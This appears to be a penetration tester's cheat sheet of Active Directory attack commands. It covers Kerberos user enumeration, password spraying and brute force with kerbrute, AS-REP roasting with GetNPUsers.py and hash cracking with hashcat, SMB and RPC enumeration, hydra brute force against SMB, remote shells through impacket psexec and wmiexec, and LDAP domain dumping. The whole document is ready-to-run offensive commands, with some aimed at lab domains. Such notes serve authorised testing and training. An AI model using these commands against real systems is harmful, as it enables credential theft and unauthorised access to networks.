
Using kerbrute bruteforce :
```bash
kerbrute userenum --domain htb.local usernames --dc 10.10.10.4
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
```

Uses port 135 RPC:
```bash
rpcclient -U "local Username" <domain ip>
rpcclient $>lookupsids local_username
rpcclient $>enumdomusers                  #enumerate local username
rpcclient $>enumdomgroups                 #enumerate groups in active directory
rpcclient $>querygroup <rid of group>     #enumerate number of users in groups
rpcclient $>querygroupmem <rid of group>  #enumerate rid of users in group
rpcclient $>queryuser <rid of user>       #enumerate user by providing rid
```

Enumerate compromised user:
```bash
impacket-lookupsid username:password@<DC IP>
```

Enumerate kerberos:
```bash
nmap -p 88 --script krb5-enum-users <target>

kerbrute userenum --dc <domain_controller> -d <domain.local> users.txt
kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter2025!'


GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
hashcat -m 18200 asreproast_hashes.txt rockyou.txt

# AS-REP roasting
GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast.txt

```



Enumerate SMB(445,139):
```bash
using nmap:
nmap -p 139,445 <target>
nmap --script smb-os-discovery <target>
nmap --script smb-security-mode <target>
nmap --script smb-vuln-ms17-010 <target>
nmap --script smb-vuln* <target>

using enum4linux:
enum4linux -a <target>
enum4linux -U <target>
enum4linux -G <target>
enum4linux -S <target>
enum4linux -P <target>
enum4linux -o <target>

using smbclient:
smbclient -L //<target> -N
smbclient -L //<target> -U <user>%<pass>
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <user>

using rpcclient:
rpcclient -U <user>%<pass> <target>
rpcclient <target> -U "" -c "enumdomusers"
rpcclient <target> -U "" -c "enumdomgroups"
rpcclient <target> -U "" -c "getdompwinfo"
rpcclient <target> -U "" -c "lookupnames <domain>"

using crackmapexec:
crackmapexec smb <target> --shares -u '' -p ''
crackmapexec smb <target> --shares -u <user> -p <pass>
crackmapexec smb <target> --users -u <user> -p <pass>
crackmapexec smb <target> --groups -u <user> -p <pass>
crackmapexec smb <target> --vulns
crackmapexec smb <target> -u users.txt -p passwords.txt

using smbmap:
smbmap -H <target>
smbmap -H <target> -u <user> -p <pass>
smbmap -H <target> -R <share>

using hydra:
hydra -l <user> -P /path/to/passwordlist.txt smb://<target>
hydra -L users.txt -P passwords.txt smb://<target>


#try to get shell if $ADMIN having write permission for the user
impacket-psexec username@<ip address>
impacket-wmiexec username@<ip address>

```

Port 389,636 LDAP enumeration :
```bash
ldapsearch -H ldap://<dc-ip> -x -s base nameingcontext
ldapsearch -H ldap://<dc-ip> -D "username@domain.name" -w "password" -b "DC=UAP,DC=local"
ldapdomaindump -u UAP.local\\peter -p "password" <domain-ip> #get all information about 
```